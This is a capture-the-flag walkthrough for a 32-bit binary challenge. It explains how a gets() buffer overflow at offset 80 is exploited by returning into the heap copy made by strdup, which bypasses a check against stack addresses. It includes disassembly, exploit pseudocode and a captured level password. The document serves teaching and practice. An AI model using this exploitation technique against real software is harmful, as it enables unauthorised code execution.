# Level 2 Walkthrough

## Recon
Start by running the binary and attaching GDB to the helper function `p`.
```bash
$ gdb ./level2
gef➤ disassemble p
```

### Function `p`
```asm
0x80484d4 <p>:    push   ebp
0x80484d5 <p+1>:  mov    ebp, esp
0x80484d7 <p+3>:  sub    esp, 0x68          ; allocates 104 bytes stack frame
0x80484ed <p+25>: call   gets@plt           ; reads attacker data
0x80484f2 <p+30>: mov    eax, [ebp+4]       ; reads saved return address from stack
0x80484fb <p+39>: and    eax, 0xb0000000
0x8048500 <p+44>: cmp    eax, 0xb0000000    ; accept only 0xb0.. range
...
0x804852d <p+89>: call   puts@plt
0x8048532 <p+94>: lea    eax, [ebp-0x4c]
0x8048538 <p+100>:call  strdup@plt          ; duplicate attacker input
```
Key points:
- `gets` reads into a 76-byte buffer with no bounds checking, allowing overflow.
- Before returning, the code rejects return addresses in the range `0xb0000000–0xbfffffff` (stack addresses). This
prevents classic stack-based shellcode execution.
- Fortunately, `strdup` is called on our buffer; the resulting heap chunk **is** in the allowed range.

### Finding the Offset
Create a 128-byte cyclic pattern, crash the program, and use `pattern search $eip`. EIP is overwritten at offset 80.

### Locating a Suitable Address
Use `ltrace` or GDB to capture the `strdup` return address:
```bash
level2@RainFall:~$ ltrace ./level2
strdup("AAAA...") = 0x0804a008
```
The `strdup` call returns a heap pointer around `0x0804a0xx`. Since `(0x0804a0xx & 0xb0000000) != 0xb0000000`, this
address **passes** the validation check.

## Exploit Plan
1. Place shellcode at the beginning of the payload
2. Pad to offset 80 (76-byte buffer + 4-byte saved EBP)
3. Overwrite saved EIP with the heap address returned by `strdup`
4. The heap address passes the `0xb0000000` check, allowing execution to continue
5. `strdup` returns a pointer to our shellcode on the heap
6. When `p()` returns, EIP jumps to the heap shellcode

Pseudocode:
```
shellcode = b"\x90"*16 + b"...\xcc"
payload = shellcode.ljust(80, b"A") + p32(0x0804a008)
print(payload.decode('latin1'), end="")
```

## Execution
```bash
$ python3 source.py | ./level2
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Takeaways
- Masking the return address doesn’t help when the program itself copies our data to a trusted heap chunk.
- Always inspect helper functions for side effects such as `strdup`, `malloc`, etc., which can become ROP/shellcode
trampolines.

